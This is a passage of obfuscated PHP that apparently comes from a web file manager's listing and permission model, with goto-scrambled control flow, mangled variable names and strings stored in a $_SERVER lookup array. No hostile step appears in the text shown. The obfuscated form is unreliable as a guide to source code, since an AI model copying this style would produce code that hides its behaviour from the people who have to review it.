str_replace($c≠æ‹¥™°Ø[47], $c≠æ‹¥™°Ø[431], $B¶ïÇÿêÈ√[0]); if (strpos($FÍ€î¢∆ÙÃ, $c≠æ‹¥™°Ø[435])) { $FÍ€î¢∆ÙÃ = str_replace($c≠æ‹¥™°Ø[435], $c≠æ‹¥™°Ø[436], $FÍ€î¢∆ÙÃ); } else { $FÍ€î¢∆ÙÃ .= $c≠æ‹¥™°Ø[437] . $B¶ïÇÿêÈ√[1]; } $f¥·ÂãÈ“’ = array(); goto aë≠Ê∑¨òà; fêäΩè…ü: if ($bÕ¶Ç†Á´¥) { $B¶âëñ…Ô«[$c≠æ‹¥™°Ø[367]] = $bÕ¶Ç†Á´¥; } goto Dâ∫›ëŒÁÇ; A⁄Êà“„±√: if ($eáì∏‡ÇÚñ[$c≠æ‹¥™°Ø[366]] <= 1) { return; } if ($eáì∏‡ÇÚñ[$c≠æ‹¥™°Ø[365]] >= 100000) { return; } if (Model($c≠æ‹¥™°Ø[427])->get($c≠æ‹¥™°Ø[428]) != $c≠æ‹¥™°Ø[429]) { return; } goto aÂŒ∫ﬁúäÖ; Dâ∫›ëŒÁÇ: } protected function _makeOrder($AóÑå¶ì„‘ = false) { goto Dè•»«äùà; bˆÜ‡ë—Ù∂: if ($FÈÿøø€à© == $AÀñƒíöú√[28]) { } $E•ÉﬂÂ≥àÏ = $AÀñƒíöú√[451] . $Dã˜Àõ˘Ö›[$FÈÿøø€à©] . $AÀñƒíöú√[50] . $BëÖÕﬁÂŒ’[$A¿‡ÑÙÔ¬Æ]; $E•ÉﬂÂ≥àÏ = rtrim(trim($E•ÉﬂÂ≥àÏ), $AÀñƒíöú√[47]); goto DÖÆ»ò◊º; DÖÆ»ò◊º: if ($AóÑå¶ì„‘) { return array($E•ÉﬂÂ≥àÏ, $BëÖÕﬁÂŒ’[$A¿‡ÑÙÔ¬Æ]); } return $this->order($E•ÉﬂÂ≥àÏ); goto E∂â≈‘§¢ô; DçÂàº†≈Ü: $BëÖÕﬁÂŒ’ = array($AÀñƒíöú√[442] => $AÀñƒíöú√[443], $AÀñƒíöú√[444] => $AÀñƒíöú√[445]); $Dã˜Àõ˘Ö› = array($AÀñƒíöú√[28] => $AÀñƒíöú√[28], $AÀñƒíöú√[78] => $AÀñƒíöú√[78], $AÀñƒíöú√[168] => $AÀñƒíöú√[407], $AÀñƒíöú√[446] => $AÀñƒíöú√[446], $AÀñƒíöú√[447] => $AÀñƒíöú√[448], $AÀñƒíöú√[194] => $AÀñƒíöú√[194], $AÀñƒíöú√[84] => $AÀñƒíöú√[84]); $FÈÿøø€à© = Input::get($AÀñƒíöú√[449], $AÀñƒíöú√[7], $b©ü˘¿†–›, array_keys($Dã˜Àõ˘Ö›)); goto a‡äíºûúœ; Dè•»«äùà: $AÀñƒíöú√ =& $_SERVER[’ÿƒ†ïò]; $b©ü˘¿†–› = Model($AÀñƒíöú√[439])->get($AÀñƒíöú√[440]); $c∑≥Â»’Œß = Model($AÀñƒíöú√[439])->get($AÀñƒíöú√[441]); goto DçÂàº†≈Ü; a‡äíºûúœ: $A¿‡ÑÙÔ¬Æ = Input::get($AÀñƒíöú√[450], $AÀñƒíöú√[7], $c∑≥Â»’Œß, array_keys($BëÖÕﬁÂŒ’)); if (!in_array($FÈÿøø€à©, array_keys($Dã˜Àõ˘Ö›))) { $FÈÿøø€à© = $AÀñƒíöú√[28]; } if (!in_array($A¿‡ÑÙÔ¬Æ, array_keys($BëÖÕﬁÂŒ’))) { $FÈÿøø€à© = $AÀñƒíöú√[442]; } goto bˆÜ‡ë—Ù∂; E∂â≈‘§¢ô: } protected function _listDataApplyItem($CºèËÚú∑Ë, $díﬁù¬”…— = false) { $CŸ§¢‹¿‰– = array($CºèËÚú∑Ë); $this->_listDataApply($CŸ§¢‹¿‰–, $díﬁù¬”…—); return $CŸ§¢‹¿‰–[0]; } protected function _listDataApply(&$e‚Âß¨∏Ã°, $BµŒé·´ÊÆ = false) { goto BÁòâäá¡ó; BÁòâäá¡ó: $b—·∫ª—Ôá =& $_SERVER[’ÿƒ†ïò]; if (!$e‚Âß¨∏Ã°) { $e‚Âß¨∏Ã° = array(); return; } $eˆ«∂Îñò¨ = array_to_keyvalue($e‚Âß¨∏Ã°, $b—·∫ª—Ôá[33], $b—·∫ª—Ôá[397]); goto aıõŒÏ”ø„; BêÒ‚ŸÊÔë: $this->_listAppendUser($e‚Âß¨∏Ã°); $this->_listFilterInfo($e‚Âß¨∏Ã°, $BµŒé·´ÊÆ); $this->_listAppendAuthSecret($e‚Âß¨∏Ã°); goto A‹Â¥∞◊ç±; aıõŒÏ”ø„: $eˆ«∂Îñò¨ = array_unique($eˆ«∂Îñò¨); $this->_listSourceCache($e‚Âß¨∏Ã°); if (!$BµŒé·´ÊÆ) { $this->_listAppendMeta($e‚Âß¨∏Ã°, $eˆ«∂Îñò¨); $this->_listAppendFileMeta($e‚Âß¨∏Ã°, $eˆ«∂Îñò¨); $this->_listAppendChildren($e‚Âß¨∏Ã°, $eˆ«∂Îñò¨); } goto FﬂŒ¯í‘®¢; FﬂŒ¯í‘®¢: $this->_listAppendPath($e‚Âß¨∏Ã°); $this->_listAppendAuth($e‚Âß¨∏Ã°); $this->_listAppendSourceInfo($e‚Âß¨∏Ã°, $eˆ«∂Îñò¨); goto BêÒ‚ŸÊÔë; A‹Â¥∞◊ç±: } protected function _listSourceCache($f÷‡Âìæ⁄¨) { $a◊ﬂéäØ˜∞ =& $_SERVER[’ÿƒ†ïò]; foreach ($f÷‡Âìæ⁄¨ as $FöÍÍëæ›Õ) { self::$cacheSourceInfo[$a◊ﬂéäØ˜∞[452] . $FöÍÍëæ›Õ[$a◊ﬂéäØ˜∞[397]]] = $FöÍÍëæ›Õ; } } protected function _listFilterInfo(&$eÔ™Ù‚‚Ò‡, $Cæ‚”óâêà = false) { $f∆ß©Ωì≠ï =& $_SERVER[’ÿƒ†ïò]; foreach ($eÔ™Ù‚‚Ò‡ as &$bËù⁄€—ä¨) { $bËù⁄€—ä¨ = $this->pathInfoFilter($bËù⁄€—ä¨); self::$cachePathInfo[$f∆ß©Ωì≠ï[453] . intval($Cæ‚”óâêà) . $f∆ß©Ωì≠ï[454] . $bËù⁄€—ä¨[$f∆ß©Ωì≠ï[397]]] = $bËù⁄€—ä¨; } unset($bËù⁄€—ä¨); } protected function _listMake(&$CûÊÉ≈üùΩ) { $d´Œì§µÈ… =& $_SERVER[’ÿƒ†ïò]; $CûÊÉ≈üùΩ[$d´Œì§µÈ…[75]] = array(); $CûÊÉ≈üùΩ[$d´Œì§µÈ…[74]] = array(); foreach ($CûÊÉ≈üùΩ[$d´Œì§µÈ…[367]] as $E≠€ëÊˆËë) { $Fı∂çïÌ∫ë = $E≠€ëÊˆËë[$d´Œì§µÈ…[405]] == 1 ? $d´Œì§µÈ…[75] : $d´Œì§µÈ…[74]; $CûÊÉ≈üùΩ[$Fı∂çïÌ∫ë][] = $E≠€ëÊˆËë; } unset($CûÊÉ≈üùΩ[$d´Œì§µÈ…[367]]); } protected function _listAppendMeta(&$c„ÔÕÆûÃ, $D™Ëºà›ºõ) { goto DßâŒΩëÒó; f∏À¢µÑ°á: foreach ($aÈ«´éõËπ as $cÉ£ùÍ¡ãâ) { if (!isset($a⁄µÓìé¨à[$cÉ£ùÍ¡ãâ[$C ƒ©Ï©”√[397]]])) { $a⁄µÓìé¨à[$cÉ£ùÍ¡ãâ[$C ƒ©Ï©”√[397]]] = array(); } if (in_array($cÉ£ùÍ¡ãâ[$C ƒ©Ï©”√[93]], $F´π÷Ùãê∞)) { continue; } $a⁄µÓìé¨à[$cÉ£ùÍ¡ãâ[$C ƒ©Ï©”√[397]]][$cÉ£ùÍ¡ãâ[$C ƒ©Ï©”√[93]]] = $cÉ£ùÍ¡ãâ[$C ƒ©Ï©”√[372]]; } foreach ($c„ÔÕÆûÃ as &$dºÀà™≥∂•) { $dºÀà™≥∂•[$C ƒ©Ï©”√[459]] = !1; if (isset($a⁄µÓìé¨à[$dºÀà™≥∂•[$C ƒ©Ï©”√[397]]])) { $dºÀà™≥∂•[$C ƒ©Ï©”√[459]] = $a⁄µÓìé¨à[$dºÀà™≥∂•[$C ƒ©Ï©”√[397]]]; } if ($this->fileIsLock($dºÀà™≥∂•) && $dºÀà™≥∂•[$C ƒ©Ï©”√[408]]) { $D¥ËáıéãÖ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $dºÀà™≥∂•[$C ƒ©Ï©”√[408]][$C ƒ©Ï©”√[409]] = AuthModel::authDisable($dºÀà™≥∂•[$C ƒ©Ï©”√[408]][$C ƒ©Ï©”√[409]], $D¥ËáıéãÖ); $dºÀà™≥∂•[$C ƒ©Ï©”√[408]][$C ƒ©Ï©”√[460]][$C ƒ©Ï©”√[408]] = $dºÀà™≥∂•[$C ƒ©Ï©”√[408]][$C ƒ©Ï©”√[409]]; } } unset($dºÀà™≥∂•); goto bπŒÈú›Õ⁄; DßâŒΩëÒó: $C ƒ©Ï©”√ =& $_SERVER[’ÿƒ†ïò]; $CÖøóü˜õÊ = array($C ƒ©Ï©”√[412] => array($C ƒ©Ï©”√[413], $D™Ëºà›ºõ)); $aÈ«´éõËπ = Model($C ƒ©Ï©”√[455])->field($C ƒ©Ï©”√[456])->where($CÖøóü˜õÊ)->select(); goto dû«´•ΩÁ®; dû«´•ΩÁ®: if (!$aÈ«´éõËπ) { return; } $F´π÷Ùãê∞ = array($C ƒ©Ï©”√[457], $C ƒ©Ï©”√[458], $C ƒ©Ï©”√[436]); $a⁄µÓìé¨à = array(); goto f∏À¢µÑ°á; bπŒÈú›Õ⁄: } protected function _listAppendFileMeta(&$a∏∫Û¨ﬂêò, $EèàßöÛãÎ) { goto a√≈“ä„Ëﬂ; F÷¬´öπõ∫: $b˜‘çñ≤£ = Model($a€ïÉâ¿◊∆[464])->field($C…Êæü¿Ûæ)->where($a“Æ¬≠ΩÖ‚)->select(); $b˜‘çñ≤£ = array_to_keyvalue($b˜‘çñ≤£, $a€ïÉâ¿◊∆[461]); $E¬äöÔ¨èö = Model($a€ïÉâ¿◊∆[465])->field($a€ïÉâ¿◊∆[466])->where($a“Æ¬≠ΩÖ‚)->select(); goto Aí¥£ÉﬁåÓ; fè“Ûõ∞öâ: foreach ($a∏∫Û¨ﬂêò as &$E∏‹°›≠”ı) { goto DΩ˜‡ÏÎ®Ô; DΩ˜‡ÏÎ®Ô: $c°ÜÁŒëÏ¢ = $E∏‹°›≠”ı[$a€ïÉâ¿◊∆[461]]; if (!$c°ÜÁŒëÏ¢ || !is_array($b˜‘çñ≤£[$c°ÜÁŒëÏ¢])) { continue; } $eêÓöâààá = $b˜‘çñ≤£[$c°ÜÁŒëÏ¢]; goto aß–—õÕı…; aß–—õÕı…: $eêÓöâààá[$a€ïÉâ¿◊∆[78]] = $E∏‹°›≠”ı[$a€ïÉâ¿◊∆[78]]; $eêÓöâààá[$a€ïÉâ¿◊∆[28]] = $E∏‹°›≠”ı[$a€ïÉâ¿◊∆[28]]; if (!isset(self::$cacheFileInfo[$a€ïÉâ¿◊∆[467] . $c°ÜÁŒëÏ¢])) { self::$cacheFileInfo[$a€ïÉâ¿◊∆[467] . $c°ÜÁŒëÏ¢] = array_merge(array(), $eêÓöâààá); } goto DÓÕü∞≤Õ√; DØ’¯—∞Ê‘: if (isset($E∏‹°›≠”ı[$a€ïÉâ¿◊∆[164]][$a€ïÉâ¿◊∆[163]])) { $E∏‹°›≠”ı[$a€ïÉâ¿◊∆[163]] = json_decode($E∏‹°›≠”ı[$a€ïÉâ¿◊∆[164]][$a€ïÉâ¿◊∆[163]], !0); unset($E∏‹°›≠”ı[$a€ïÉâ¿◊∆[164]][$a€ïÉâ¿◊∆[163]]); } goto e©è—†ÛÕ•; DÓÕü∞≤Õ√: unset($b˜‘çñ≤£[$c°ÜÁŒëÏ¢][$a€ïÉâ¿◊∆[76]]); $C˘≥öÆË∆æ = is_array($cõ˜¨ƒßØﬁ[$c°ÜÁŒëÏ¢]) ? $cõ˜¨ƒßØﬁ[$c°ÜÁŒëÏ¢] : array(); $E∏‹°›≠”ı[$a€ïÉâ¿◊∆[164]] = array_merge($C˘≥öÆË∆æ, $b˜‘çñ≤£[$c°ÜÁŒëÏ¢]); goto DØ’¯—∞Ê‘; e©è—†ÛÕ•: } unset($E∏‹°›≠”ı); goto Cπ¯”ÏÆΩº; Aí¥£ÉﬁåÓ: $E¬äöÔ¨èö = $E¬äöÔ¨èö ? $E¬äöÔ¨èö : array(); $cõ˜¨ƒßØﬁ = array(); foreach ($E¬äöÔ¨èö as $a·„íÜ·»⁄) { if (!isset($cõ˜¨ƒßØﬁ[$a·„íÜ·»⁄[$a€ïÉâ¿◊∆[461]]])) { $cõ˜¨ƒßØﬁ[$a·„íÜ·»⁄[$a€ïÉâ¿◊∆[461]]] = array(); } $cõ˜¨ƒßØﬁ[$a·„íÜ·»⁄[$a€ïÉâ¿◊∆[461]]][$a·„íÜ·»⁄[$a€ïÉâ¿◊∆[93]]] = $a·„íÜ·»⁄[$a€ïÉâ¿◊∆[372]]; } goto fè“Ûõ∞öâ; fÉﬂ∑å≥èÎ: if (!$e•∏≠äøÑÑ) { return; } $a“Æ¬≠ΩÖ‚ = array($a€ïÉâ¿◊∆[462] => array($a€ïÉâ¿◊∆[413], $e•∏≠äøÑÑ)); $C…Êæü¿Ûæ = $a€ïÉâ¿◊∆[463]; goto F÷¬´öπõ∫; a√≈“ä„Ëﬂ: $a€ïÉâ¿◊∆ =& $_SERVER[’ÿƒ†ïò]; $e•∏≠äøÑÑ = array_to_keyvalue($a∏∫Û¨ﬂêò, $a€ïÉâ¿◊∆[33], $a€ïÉâ¿◊∆[461]); $e•∏≠äøÑÑ = array_filter(array_unique($e•∏≠äøÑÑ)); goto fÉﬂ∑å≥èÎ; Cπ¯”ÏÆΩº: } protected function _listAppendSourceInfo(&$B÷à¬èÑ»ì, $dŒÑ¢÷√ÉÑ) { goto dåé„âòÁ; F∏ÏÁÒÔç”: return $B÷à¬èÑ»ì; goto F’«ÿç¬Éâ; dåé„âòÁ: $c§ÈÉ´ÕÊË =& $_SERVER[’ÿƒ†ïò]; if (!defined($c§ÈÉ´ÕÊË[468])) { return; } $AßÁñ±®≥ = Model($c§ÈÉ´ÕÊË[469])->listData(); goto aè¯á´ü≈¶; fú‹—ÎÌ„Ó: $E∞∫º”Ñ£à = array_to_keyvalue($AßÁñ±®≥, $c§ÈÉ´ÕÊË[395]); $eé≠©—»º√ = array_to_keyvalue_group($fñö‹àîÙä, $c§ÈÉ´ÕÊË[76], $c§ÈÉ´ÕÊË[421]); $cÿ∂Ó«ª†â = array_to_keyvalue($B¶ÛÊÇÏ‹Ï, $c§ÈÉ´ÕÊË[76]); goto dÍ◊Â€¿ô∑; dÍ◊Â€¿ô∑: $EÊÖøæå∆≤ = array_to_keyvalue_group($d⁄ï•√›˜∑, $c§ÈÉ´ÕÊË[397]); foreach ($B÷à¬èÑ»ì as &$bÂîúêÚÛΩ) { $bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[85]] = array($c§ÈÉ´ÕÊË[471] => 0, $c§ÈÉ´ÕÊË[472] => 0, $c§ÈÉ´ÕÊË[473] => 0); if (isset($cÿ∂Ó«ª†â[$bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[397]]])) { $bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[85]][$c§ÈÉ´ÕÊË[474]] = 1; $bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[85]][$c§ÈÉ´ÕÊË[475]] = $cÿ∂Ó«ª†â[$bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[397]]][$c§ÈÉ´ÕÊË[28]]; } if (isset($eé≠©—»º√[$bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[397]]])) { $bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[85]][$c§ÈÉ´ÕÊË[476]] = array(); foreach ($eé≠©—»º√[$bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[397]]] as $e¶“ÛÜöä’) { $b—â¥Òä≠ = $E∞∫º”Ñ£à[$e¶“ÛÜöä’]; $bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[85]][$c§ÈÉ´ÕÊË[476]][] = array($c§ÈÉ´ÕÊË[477] => $b—â¥Òä≠[$c§ÈÉ´ÕÊË[395]], $c§ÈÉ´ÕÊË[415] => $b—â¥Òä≠[$c§ÈÉ´ÕÊË[28]], $c§ÈÉ´ÕÊË[478] => $b—â¥Òä≠[$c§ÈÉ´ÕÊË[479]]); } } if (isset($EÊÖøæå∆≤[$bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[397]]])) { $bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[85]][$c§ÈÉ´ÕÊË[480]] = array(); foreach ($EÊÖøæå∆≤[$bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[397]]] as $BáÑüÖåÇí) { $bÂîúêÚÛΩ[$c§ÈÉ´ÕÊË[85]][$c§ÈÉ´ÕÊË[480]] = array($c§ÈÉ´ÕÊË[481] => $BáÑüÖåÇí[$c§ÈÉ´ÕÊË[482]], $c§ÈÉ´ÕÊË[483] => $BáÑüÖåÇí[$c§ÈÉ´ÕÊË[484]], $c§ÈÉ´ÕÊË[485] => $BáÑüÖåÇí[$c§ÈÉ´ÕÊË[397]], $c§ÈÉ´ÕÊË[486] => $BáÑüÖåÇí[$c§ÈÉ´ÕÊË[487]], $c§ÈÉ´ÕÊË[488] => $BáÑüÖåÇí[$c§ÈÉ´ÕÊË[489]], $c§ÈÉ´ÕÊË[490] => $BáÑüÖåÇí[$c§ÈÉ´ÕÊË[490]], $c§ÈÉ´ÕÊË[491] => $BáÑüÖåÇí[$c§ÈÉ´ÕÊË[491]]); } } } unset($bÂîúêÚÛΩ); goto F∏ÏÁÒÔç”; aè¯á´ü≈¶: $fñö‹àîÙä = Model($c§ÈÉ´ÕÊË[420])->listData(); $B¶ÛÊÇÏ‹Ï = Model($c§ÈÉ´ÕÊË[410])->listData(); $d⁄ï•√›˜∑ = Model($c§ÈÉ´ÕÊË[470])->listSimple(); goto fú‹—ÎÌ„Ó; F’«ÿç¬Éâ: } protected function _listAppendChildren(&$FÎì≈ÀÃÊî, $CÌà£˜Àèƒ) { goto CˆÕ∂ûÖÔª; cﬂ√Ã’¶÷£: foreach ($FÎì≈ÀÃÊî as &$e∞•ÊˆòŸÿ) { if (!$e∞•ÊˆòŸÿ[$Búìƒù¨‹†[405]]) { continue; } $a®”œÊÑ É[] = $e∞•ÊˆòŸÿ[$Búìƒù¨‹†[397]]; } unset($e∞•ÊˆòŸÿ); if (!$a®”œÊÑ É) { return; } goto FÂëÑÓá¯ÿ; FÂëÑÓá¯ÿ: $E Æ≥Ì…´´ = array($Búìƒù¨‹†[492] => array($Búìƒù¨‹†[7], $a®”œÊÑ É)); $f˘“ﬁ¨Û…‘ = array($Búìƒù¨‹†[492], $Búìƒù¨‹†[405], $Búìƒù¨‹†[493] => $Búìƒù¨‹†[494]); $E˘¨ﬁ¥ø¥ﬁ = $this->field($f˘“ﬁ¨Û…‘)->where($E Æ≥Ì…´´)->group($Búìƒù¨‹†[495])->select(); goto b¡¥àü ﬁ—; c¯Œ√ÎëäŒ: unset($e∞•ÊˆòŸÿ); goto Cë∞ÉüÂÃ∫; CˆÕ∂ûÖÔª: $Búìƒù¨‹† =& $_SERVER[’ÿƒ†ïò]; $a®”œÊÑ É = array(); $aÀ‰ï¿≈‰ø = array($Búìƒù¨‹†[203] => 0, $Búìƒù¨‹†[204] => 0); goto cﬂ√Ã’¶÷£; b¡¥àü ﬁ—: $b⁄çêâÿËı = array(); foreach ($E˘¨ﬁ¥ø¥ﬁ as $B˜£ñ™óå¿) { $d≈ÎÈËåèË = $B˜£ñ™óå¿[$Búìƒù¨‹†[492]]; $eáøŸ€π”ù = $B˜£ñ™óå¿[$Búìƒù¨‹†[405]] == $Búìƒù¨‹†[87] ? $Búìƒù¨‹†[204] : $Búìƒù¨‹†[203]; if (!isset($b⁄çêâÿËı[$d≈ÎÈËåèË])) { $b⁄çêâÿËı[$d≈ÎÈËåèË] = array($Búìƒù¨‹†[203] => 0, $Búìƒù¨‹†[204] => 0); } $b⁄çêâÿËı[$d≈ÎÈËåèË][$eáøŸ€π”ù] += $B˜£ñ™óå¿[$Búìƒù¨‹†[494]]; } foreach ($FÎì≈ÀÃÊî as &$e∞•ÊˆòŸÿ) { if (!$e∞•ÊˆòŸÿ[$Búìƒù¨‹†[405]]) { continue; } $Bú◊µçÇéµ = is_array($b⁄çêâÿËı[$e∞•ÊˆòŸÿ[$Búìƒù¨‹†[397]]]) ? $b⁄çêâÿËı[$e∞•ÊˆòŸÿ[$Búìƒù¨‹†[397]]] : $aÀ‰ï¿≈‰ø; $e∞•ÊˆòŸÿ[$Búìƒù¨‹†[204]] = $Bú◊µçÇéµ[$Búìƒù¨‹†[204]]; $e∞•ÊˆòŸÿ[$Búìƒù¨‹†[203]] = $Bú◊µçÇéµ[$Búìƒù¨‹†[203]]; unset($e∞•ÊˆòŸÿ[$Búìƒù¨‹†[407]]); } goto c¯Œ√ÎëäŒ; Cë∞ÉüÂÃ∫: } protected function _listAppendAuth(&$EÓüñƒ¡’) { goto b‹ãªåÃö•; E™êÑŸí€¶: foreach ($EÓüñƒ¡’ as $b®˜—é¥¶Ö) { if ($b®˜—é¥¶Ö[$aıº‘æË™±[406]] == self::TYPE_GROUP) { $C§ˆıÍïÙ°[] = $b®˜—é¥¶Ö[$aıº‘æË™±[397]]; } } if (!$C§ˆıÍïÙ°) { return; } $AÜÙßâ”ﬂ˘ = array_to_keyvalue($EÓüñƒ¡’, $aıº‘æË™±[397]); goto aáÊì˘ª¬Á; b‹ãªåÃö•: $aıº‘æË™± =& $_SERVER[’ÿƒ†ïò]; if (!defined($aıº‘æË™±[468])) { return; } $C§ˆıÍïÙ° = array(); goto E™êÑŸí€¶; aáÊì˘ª¬Á: $a±àªÉ©¯˘ = Model($aıº‘æË™±[496])->getSourceList($C§ˆıÍïÙ°, $AÜÙßâ”ﬂ˘); foreach ($EÓüñƒ¡’ as $bØÔ‡Ÿõ∆é => &$b®˜—é¥¶Ö) { $b®˜—é¥¶Ö[$aıº‘æË™±[408]] = $a±àªÉ©¯˘[$b®˜—é¥¶Ö[$aıº‘æË™±[397]]]; if (!$b®˜—é¥¶Ö[$aıº‘æË™±[408]] && $b®˜—é¥¶Ö[$aıº‘æË™±[406]] == self::TYPE_GROUP) { $b®˜—é¥¶Ö[$aıº‘æË™±[408]] = Action($aıº‘æË™±[497])->pathGroupAuthMake($b®˜—é¥¶Ö[$aıº‘æË™±[498]]); if (!$b®˜—é¥¶Ö[$aıº‘æË™±[408]] && !_get($GLOBALS, $aıº‘æË™±[499])) { $b®˜—é¥¶Ö[$aıº‘æË™±[196]] = !1; $b®˜—é¥¶Ö[$aıº‘æË™±[195]] = !1; } } if ($b®˜—é¥¶Ö[$aıº‘æË™±[408]]) { $b®˜—é¥¶Ö[$aıº‘æË™±[196]] = AuthModel::authCheckEdit($b®˜—é¥¶Ö[$aıº‘æË™±[408]][$aıº‘æË™±[409]]); $b®˜—é¥¶Ö[$aıº‘æË™±[195]] = AuthModel::authCheckView($b®˜—é¥¶Ö[$aıº‘æË™±[408]][$aıº‘æË™±[409]]); } $this->groupPathDisplay($b®˜—é¥¶Ö); } unset($b®˜—é¥¶Ö); goto cÀéæÖ´∑â; cÀéæÖ´∑â: } public function _listAppendAuthSecret(&$D·•ÜÚ¶Ò¬) { goto EÉë¿£∏ö√; e»¯‚°Öö¯: $eï“÷Œá‰÷ = $this->_listAppendPath($a∆¯≥ÔıÜâ, !0); foreach ($D·•ÜÚ¶Ò¬ as $Cå™Ô’¬Ïå => &$D®Ç…¶ª…≈) { if (!is_array($D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]])) { continue; } if ($D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[406]] != $d°∫“Û»ΩÜ[509]) { continue; } if (isset($eﬂìØ€Ü”¡[$D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[397]]])) { goto CË…•ßœô≈; C¬µÕ”®˘·: $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[511]] = $A∑ÂËΩñì∆; $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[512]] = $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[513]]; $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[514]] = $d°∫“Û»ΩÜ[87]; goto A≠†Ìè∫∆•; CË…•ßœô≈: $A∑ÂËΩñì∆ = $eﬂìØ€Ü”¡[$D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[397]]]; if (!is_array($D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[459]])) { $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[459]] = array(); } $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[459]][$d°∫“Û»ΩÜ[510]] = $A∑ÂËΩñì∆[$d°∫“Û»ΩÜ[504]]; goto C¬µÕ”®˘·; A≠†Ìè∫∆•: if ($A∑ÂËΩñì∆[$d°∫“Û»ΩÜ[446]] != $céåÈöìÚè) { $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[409]] = $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[409]] & $A∑ÂËΩñì∆[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[408]]; } continue; goto a√–ü⁄Ü«ñ; a√–ü⁄Ü«ñ: } $aŸ‰ÛÉ˜ïØ = $this->parentLevelArray($D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[515]]); $Bü§äÇ§ãó = array_reverse($aŸ‰ÛÉ˜ïØ); foreach ($Bü§äÇ§ãó as $aœÑëòóÖ† => $dá¨ãÀåÁ‡) { goto a¯ﬁÂû“ßÑ; a°ˆ–®ÿñË: if ($A∑ÂËΩñì∆[$d°∫“Û»ΩÜ[446]] != $céåÈöìÚè) { $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[409]] = $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[409]] & $A∑ÂËΩñì∆[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[408]]; } $B‘◊•·“ì = $d°∫“Û»ΩÜ[33]; $AÙ¡‹÷È€Ó = count($aŸ‰ÛÉ˜ïØ) - $aœÑëòóÖ†; goto d≠÷µ˜æ£˜; d≠÷µ˜æ£˜: for ($E”≥≈´õÉØ = 0; $E”≥≈´õÉØ < $AÙ¡‹÷È€Ó; $E”≥≈´õÉØ++) { if (!isset($eï“÷Œá‰÷[$aŸ‰ÛÉ˜ïØ[$E”≥≈´õÉØ]])) { $B‘◊•·“ì = $d°∫“Û»ΩÜ[33]; break; } $B‘◊•·“ì = $B‘◊•·“ì . rtrim($eï“÷Œá‰÷[$aŸ‰ÛÉ˜ïØ[$E”≥≈´õÉØ]], $d°∫“Û»ΩÜ[8]) . $d°∫“Û»ΩÜ[8]; } $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[512]] = rtrim($B‘◊•·“ì, $d°∫“Û»ΩÜ[8]) . $d°∫“Û»ΩÜ[8]; break; goto E§¶…µæ®–; a¯ﬁÂû“ßÑ: if (!isset($eﬂìØ€Ü”¡[$dá¨ãÀåÁ‡])) { continue; } $A∑ÂËΩñì∆ = $eﬂìØ€Ü”¡[$dá¨ãÀåÁ‡]; $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]][$d°∫“Û»ΩÜ[511]] = $A∑ÂËΩñì∆; goto a°ˆ–®ÿñË; E§¶…µæ®–: } } unset($D®Ç…¶ª…≈); goto f®∞»Ÿ∞ﬂº; EÉë¿£∏ö√: $d°∫“Û»ΩÜ =& $_SERVER[’ÿƒ†ïò]; if (Model($d°∫“Û»ΩÜ[427])->get($d°∫“Û»ΩÜ[500]) != $d°∫“Û»ΩÜ[87]) { return; } static $eﬂìØ€Ü”¡ = false; goto cê£ÕñÉâ·; cê£ÕñÉâ·: if (!$eﬂìØ€Ü”¡) { goto bäù¯“Áûî; bäù¯“Áûî: $EΩ‰ˆãåÙÉ = Model($d°∫“Û»ΩÜ[501]); $Dò¨ù¥Ñ˘“ = Model($d°∫“Û»ΩÜ[502]); $eﬂìØ€Ü”¡ = $Dò¨ù¥Ñ˘“->listData(); goto a¥Çà∆æ¡; bâáüª«ñì: foreach ($eﬂìØ€Ü”¡ as $Cå™Ô’¬Ïå => $D®Ç…¶ª…≈) { goto B°˜åßﬁ∑‹; f‰êäò•É∫: if (!$Bﬁ‘≠Éè©›) { $Dò¨ù¥Ñ˘“->remove($D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[395]]); unset($eﬂìØ€Ü”¡[$Cå™Ô’¬Ïå]); continue; } $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[408]] = $Bﬁ‘≠Éè©›; $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[505]] = $DÛõåÆçÜ‡; goto B¢è÷ú…÷Í; B°˜åßﬁ∑‹: $DÛõåÆçÜ‡ = $BΩÏåÕ¨È–[$D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[504]]]; if (!$DÛõåÆçÜ‡) { $Dò¨ù¥Ñ˘“->remove($D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[395]]); 